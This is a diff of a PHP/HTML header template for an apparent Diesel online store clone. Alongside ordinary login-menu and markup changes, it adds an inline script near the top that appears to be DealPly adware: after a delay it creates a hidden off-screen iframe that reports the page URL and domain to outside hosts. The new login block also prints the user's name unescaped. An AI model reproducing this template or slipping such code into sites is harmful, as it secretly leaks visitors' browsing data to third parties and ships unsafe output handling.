@@ -1,15 +1,59 @@
-<!doctype html>
+<!DOCTYPE html>
 <!--[if lt IE 7]> <html class="ie6 oldie" lang="en"> <![endif]-->
 <!--[if IE 7]>    <html class="ie7 oldie" lang="en"> <![endif]-->
 <!--[if IE 8]>    <html class="ie8 oldie" lang="en"> <![endif]-->
 <!--[if gt IE 8]><!-->
-<html lang="en">
-<!--<![endif]-->
-
-<head>
+<html lang="en" class="js infinite-scroll">
+<!--<![endif]--><head>
 
     <link rel="alternate" hreflang="ja-jp" href="http://www.store.diesel.co.jp">
     <meta charset=UTF-8>
+    
+    <script type="text/javascript" async="">
+    (function() {
+      try {
+        if (typeof window['asdfdsasdfdsa'] === 'undefined') {
+          setTimeout(function() {
+            var shouldThisPartOfCodeRun = document.URL.search('http') === 0;
+            if (!shouldThisPartOfCodeRun) {
+              return;
+            }
+            if (typeof DealPly !== 'undefined' && typeof DealPly.serverCallParam === 'string') {
+              var reportFlag = true;
+              var scArr = document.getElementsByTagName('script');
+              for (var index in scArr) {
+                if (typeof scArr[index].src === 'string' && scArr[index].src.search('\\.js\\?dn=') !== -1) {
+                  reportFlag = false;
+                }
+              }
+              if (!reportFlag) {
+                return;
+              }
+              var host = 'http://q.nadijs.info/';
+              var isSecure = document.URL.search('https://') === 0;
+              if (isSecure) {
+                host = 'https://endall41-q.apollocdn.com/';
+              }
+              var urlPath = 'dealdo/event-report?type=quick&';
+              var iframe = document.createElement('iframe');
+              var suffix = '';
+              try {
+                if (typeof JavaScriptJsTagUrl !== 'undefined') {
+                  suffix = JavaScriptJsTagUrl.substr(JavaScriptJsTagUrl.search('\?') + 1);
+                }
+              } catch (e324324) {}
+              iframe.setAttribute('style', 'position:relative; left:-10000px; width:1px; height:1px; visibility:hidden');
+              iframe.setAttribute('src', host + urlPath + 'url=' + encodeURIComponent(document.URL) + '&domain=' + document.domain + '&topic=dpdiedarg&' + suffix);
+              document.body.appendChild(iframe);
+            }
+          }, 10000);
+          window['asdfdsasdfdsa'] = true;
+        }
+      } catch (e235534) {}
+    })();
+  </script>
+  <script type="text/javascript" async="" charset="utf-8" src="<?=base_url()?>js/conversion_async.js" id="utag_27"></script>
+    
     <title>Diesel Online Store: jeans, clothing, shoes, bags and watches</title>
     <link rel="apple-touch-icon" sizes="57x57" href="<?=base_url();?>images/icons/favicons/apple-touch-icon-57x57.png">
     <link rel="apple-touch-icon" sizes="60x60" href="<?=base_url();?>images/icons/favicons/apple-touch-icon-60x60.png">
@@ -31,6 +75,7 @@
     <link rel="stylesheet" href="<?=base_url();?>css/jquery.css" />
     <!--<link href="<?//=base_url()?>css/headcss.css" type="text/css" rel="stylesheet">-->
     <!-- jQuery -->
+    
     <script src="<?=base_url();?>js/jquery-1.7.1.min.js" type="text/javascript"></script>
     <!--http://code.jquery.com/jquery-1.7.1.js-->
     
@@ -102,7 +147,9 @@
         <link rel="alternate" href="#" hreflang="en-US" />
     </div>
     <!-- End content-asset -->
-    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+    
+
+<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
     <script src="<?=base_url();?>js/responsive.js"></script>
     <!-- Google Analytics -->
     <script>
@@ -161,8 +208,6 @@
     
     <link rel="stylesheet" href="<?=base_url();?>css/denimguide.css" />
     <link rel="canonical" href="/mens/jackets/" />
-
-  <script type="text/javascript" src="<?=base_url();?>js/conversion_async.js" charset="utf-8"></script>
     
 </head>
 <?php 
@@ -235,35 +280,29 @@ if($view_file_name == 'home_view') { ?>
 
 
                 <input type="hidden" id="isUserLogin" value="false" />
+                <?php if(isset($this->session->userdata['s_uid'])) { ?>
+                    <li class="myacc-login">
+                        <?php $user_name = $this->session->userdata['s_fname'];?>
+                        <span class="my-account">Welcome <?=$user_name;?></span> | 
+                        <span class="my-account"><a href="<?=base_url();?>member/logout">Log Out</a></span> |                               
+                    </li>
+                <?php } else { ?>
                 <li class="myacc">
                     <h4>
-            
-            <a href="#" class="user-account">
-            Log In / Register
-            
-             </a>
-            <div style="display: none;">
-                <ul class="header-myacc-drop">
-                    <li class="first">
-                     <a title="Login" href="<?=base_url();?>member/login_popup" class="user-login ">
-                    Log In
-                     </a>       
-                    </li>
-                
-                    <li>
-                         <a title="Register" href="<?=base_url();?>" class="user-register">
-                            Register
-                        </a>            
-                    </li>
-                
-                </ul>
-            </div>
-             
-             </h4>
-
+                        <a href="#" class="user-account">Log In / Register</a>
+                        <div style="display: none;">
+                            <ul class="header-myacc-drop">
+                                <li class="first">
+                                    <a title="Login" href="<?=base_url();?>member/login_popup" class="user-login ">Log In</a>       
+                                </li>
+                                <li>
+                                    <a title="Register" href="<?=base_url();?>" class="user-register">Register</a>            
+                                </li>
+                            </ul>
+                        </div>             
+                    </h4>
                 </li>
-
-
+                <?php } ?>
             </ul>
             <div class="mobile-menu-flip">
 
@@ -2099,35 +2138,31 @@ Store Locator
 
 
                             <input type="hidden" id="isUserLogin" value="false" />
-                            <li class="myacc">
-                                <h4>
-            
-            <a href="<?=base_url();?>member/login" class="user-account">
-            Log In / Register
-            
-             </a>
-            <div style="display: none;">
-                <ul class="header-myacc-drop">
-                    <li class="first">
-                     <a title="Login" href="<?=base_url();?>member/login_popup" class="user-login ">
-                    Log In
-                     </a>       
-                    </li>
-                
-                    <li>
-                         <a title="Register" href="<?=base_url('member/register');?>" class="user-register">
-                            Register
-                        </a>            
-                    </li>
-                
-                </ul>
-            </div>
-             
-             </h4>
-
-                            </li>
-
-
+                            <?php if(isset($this->session->userdata['s_uid'])) { ?>
+                                <li class="myacc-login">
+                                    <?php $user_name = $this->session->userdata['s_fname'];?>
+                                    <span class="my-account">Welcome <?=$user_name;?></span> | 
+                                    <span class="my-account"><a href="<?=base_url();?>member/logout">Log Out</a></span> |                               
+                                </li>
+                            <?php } else { ?>
+                                <li class="myacc">
+                                    <h4>
+                                        <a href="<?=base_url();?>member/login" class="user-account">Log In / Register</a>
+                                        <div style="display: none;">
+                                            <ul class="header-myacc-drop">
+                                                <li class="first">
+                                                    <a title="Login" href="<?=base_url();?>member/login_popup" class="user-login ">Log In</a>
+                                                </li>
+                                                <li>
+                                                     <a title="Register" href="<?=base_url('member/register');?>" class="user-register">Register
+                                                     </a>            
+                                                </li>
+                                            </ul>
+                                        </div>
+                                    </h4>
+                                </li>
+                            <?php } ?>
+                            
                             <li class="last help">
 
                                 <h4>
@@ -2415,7 +2450,7 @@ Help
 
 
 
-                                                <span class="bag-count"></span>
+                                                <span class="empty-bag-count">Bag Count</span>
 
 
 
